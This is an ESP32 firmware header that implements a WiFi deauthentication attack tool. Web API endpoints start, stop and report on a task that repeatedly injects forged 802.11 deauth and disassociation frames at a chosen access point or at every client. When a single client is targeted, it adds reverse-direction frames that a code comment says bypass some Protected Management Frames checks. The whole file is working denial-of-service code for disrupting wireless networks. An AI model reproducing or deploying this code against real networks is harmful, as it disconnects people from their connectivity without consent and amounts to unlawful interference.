#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"
static bool dt_running = false;
static TaskHandle_t dt_task = nullptr;
static volatile uint32_t dt_errors = 0;
static uint8_t dt_bssid[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
static uint8_t dt_sta[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
static uint8_t dt_ch = 0, dt_reason = 7;
static uint32_t dt_sent = 0;
static bool dt_bcast = true;
static String dt_get(const String &q, const char *k) {
  int i = q.indexOf(String(k) + "=");
  if (i < 0)
    return "";
  i += strlen(k) + 1;
  int e = q.indexOf('&', i);
  return q.substring(i, e < 0 ? q.length() : e);
}
static void dt_run(void *) {
  uint8_t f[64];
  dt_errors = 0;
  while (dt_running) {
    if (!safety_rate_ok(1)) {
      vTaskDelay(pdMS_TO_TICKS(50));
      continue;
    }
    const uint8_t *dst = dt_bcast ? BC : dt_sta;

    // 1) AP→STA deauth
    size_t n = f_deauth(f, dst, dt_bssid, dt_reason);
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
    if (err != ESP_OK)
      err = esp_wifi_80211_tx(WIFI_IF_STA, f, n, false);
    if (err == ESP_OK)
      dt_sent++;
    else {
      if (++dt_errors == 1)
        Serial.printf("[deauth] TX: %s\n", esp_err_to_name(err));
    }

    // 2) AP→STA disassoc
    n = f_disassoc(f, dst, dt_bssid, dt_reason);
    esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
    dt_sent++;

    // 3) STA→AP deauth (reverse direction — bypasses some PMF checks)
    if (!dt_bcast) {
      n = f_deauth_r(f, dt_bssid, dt_sta, dt_reason);
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
      dt_sent++;
      n = f_disassoc_r(f, dt_bssid, dt_sta, dt_reason);
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
      dt_sent++;
    }

    vTaskDelay(pdMS_TO_TICKS(5));
  }
  dt_task = nullptr;
  vTaskDelete(nullptr);
}
static bool dt_start(const String &q) {
  String bs = dt_get(q, "bssid");
  if (bs.length() != 17)
    return false;  // require a real BSSID
  unsigned _b[6] = {0};
  int m = sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x", &_b[0], &_b[1], &_b[2], &_b[3], &_b[4], &_b[5]);
  for (int _i = 0; _i < 6; _i++) dt_bssid[_i] = (uint8_t)_b[_i];
  if (m != 6)
    return false;
  String ch = dt_get(q, "ch");
  if (ch.length())
    dt_ch = ch.toInt();
  String rs = dt_get(q, "reason");
  if (rs.length())
    dt_reason = rs.toInt();
  String bc = dt_get(q, "broadcast");
  dt_bcast = (bc != "0");
  if (dt_ch)
    esp_wifi_set_channel(dt_ch, WIFI_SECOND_CHAN_NONE);
  dt_sent = 0;
  dt_running = true;
  xTaskCreate(dt_run, "deauth", 4096, nullptr, 5, &dt_task);
  return true;
}
static void dt_stop() {
  dt_running = false;
}
static void dt_routes() {
  extern WebServer server;
  server.on("/api/deauth/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("deauth", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/deauth/stop", HTTP_POST, []() {
    tool_stop("deauth");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/deauth/status", HTTP_GET, []() {
    server.send(200, "application/json",
                "{\"running\":" + String(dt_running ? 1 : 0) + ",\"sent\":" + String(dt_sent) +
                    ",\"errors\":" + String(dt_errors) + ",\"msg\":\"sent " + String(dt_sent) +
                    " errors " + String(dt_errors) + "\"}");
  });
}
